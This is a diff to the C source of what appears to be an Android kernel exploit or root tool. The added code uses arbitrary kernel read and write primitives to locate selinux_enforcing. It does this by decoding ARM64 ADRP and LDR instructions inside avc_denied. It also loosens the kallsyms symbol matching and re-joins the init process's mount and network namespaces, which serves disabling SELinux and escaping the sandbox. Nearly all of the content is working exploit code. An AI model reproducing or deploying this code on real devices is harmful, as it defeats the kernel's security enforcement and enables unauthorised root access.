@@ -628,6 +628,50 @@ void kernel_write_uchar(unsigned long kaddr, unsigned char data)
     kernel_write(kaddr, &data, sizeof(data));
 }
 
+// code from DrZener 
+unsigned long findSelinuxEnforcingFromAvcDenied(unsigned long avc_denied_address)
+{
+    unsigned long address;
+    unsigned long selinux_enforcing_address;
+    bool adrp_found = 0;
+    for(address = avc_denied_address; address <= avc_denied_address + 0x60; address += 4)
+    {
+        unsigned int instruction = kernel_read_uint(address);
+        
+        if(!adrp_found)
+        {   
+            unsigned int instruction_masked = instruction;
+            instruction_masked >>= 24;
+            instruction_masked &= 0x9F;
+            if((instruction_masked ^ 0x90) == 0 )
+            {
+                selinux_enforcing_address = address;
+                unsigned int imm_hi, imm_lo, imm;
+                imm_hi = (instruction >> 5) &  0x7FFFF;
+                imm_lo = (instruction >> 29) & 3;
+                imm = ((imm_hi << 2) | imm_lo) << 12;
+                selinux_enforcing_address &= 0xFFFFFFFFFFFFF000;
+                selinux_enforcing_address += imm;
+                adrp_found = 1;
+            }
+        }
+        if (adrp_found)
+        {
+            unsigned int instruction_masked = instruction;
+            instruction_masked >>= 22;
+            instruction_masked &= 0x2FF;
+            if((instruction_masked ^ 0x2E5) == 0 )
+            {
+                unsigned int offset = ((instruction >> 10) & 0xFFF) << 2;
+                selinux_enforcing_address += offset;
+                message("selinux_enforcing address found");
+                return selinux_enforcing_address;
+            }
+        }
+    }
+    message("selinux_enforcing address not found");
+    return 0UL;
+}
 
 // Make the kallsyms module not check for permission to list symbol addresses
 int fixKallsymsFormatStrings(unsigned long start)
@@ -901,10 +945,11 @@ unsigned long findSymbol_memory_search(char* symbol) {
     
     unsigned long offset = kallsyms.names;
     char name[KSYM_NAME_LEN];
+    unsigned n = strlen(symbol);
     
     for(unsigned long i = 0; i < kallsyms.num_syms; i++) {
         unsigned int n = get_kallsyms_name(offset, name);
-        if (!strcmp(name+1, symbol)) {
+        if (!strncmp(name+1, symbol, n) && (name[1+n] == '.' || !name[1+n])) {
             unsigned long address = kernel_read_ulong(kallsyms.addresses + i*8);
             message( "MAIN: found %s in kernel memory at %lx", symbol, address);
             
@@ -1000,9 +1045,10 @@ unsigned long findSymbol(unsigned long pointInKernelMemory, char *symbol)
         {
             unsigned long a;
             unsigned char type;
+            unsigned n = strlen(symbol);
             char sym[1024];
             sscanf(buf, "%lx %c %s", &a, &type, sym);
-            if (!strcmp(sym, symbol)) {
+            if (!strncmp(sym, symbol, n) && (sym[n]=='.' || !sym[n])) {
                 message( "found %s in /proc/kallsyms", sym);
                 address = a;
                 break;
@@ -1132,6 +1178,18 @@ unsigned long find_thread_info_ptr_kernel3(unsigned long kstack) {
             return kstack+pos*8-8;
         
     return 0;
+}
+
+unsigned long find_selinux_enforcing(unsigned long search_base) {
+    unsigned long address = findSymbol(search_base, "selinux_enforcing");
+    if (address == 0) {
+        message("MAIN: direct search didn't work, so searching via avc_denied");
+        address = findSymbol(search_base, "avc_denied");
+        if (address == 0)
+            return 0;
+        address = findSelinuxEnforcingFromAvcDenied(address);
+    }
+    return address;
 }
 
 int main(int argc, char **argv)
@@ -1305,7 +1363,7 @@ int main(int argc, char **argv)
     message("MAIN: search_base = %lx", search_base);
     
     message("MAIN: searching for selinux_enforcing");
-    unsigned long selinux_enforcing = findSymbol(search_base, "selinux_enforcing");
+    unsigned long selinux_enforcing = find_selinux_enforcing(search_base);
     
 //    unsigned long selinux_enabled = findSymbol(search_base, "selinux_enabled");
 
@@ -1364,6 +1422,9 @@ int main(int argc, char **argv)
     }
     
     if (rejoinNS) {
+        char cwd[1024];
+        getcwd(cwd, sizeof(cwd));
+
         message("MAIN: re-joining the init mount namespace");
         int fd = open("/proc/1/ns/mnt", O_RDONLY);
 
@@ -1382,13 +1443,13 @@ int main(int argc, char **argv)
 
         if (fd < 0) {
             error("open");
-            exit(1);
         }
 
         if (setns(fd, CLONE_NEWNET) < 0) {
             error("setns");
-            exit(1);
         }    
+        
+        chdir(cwd);
     }
     
     if (!checkWhitelist(oldUID)) {
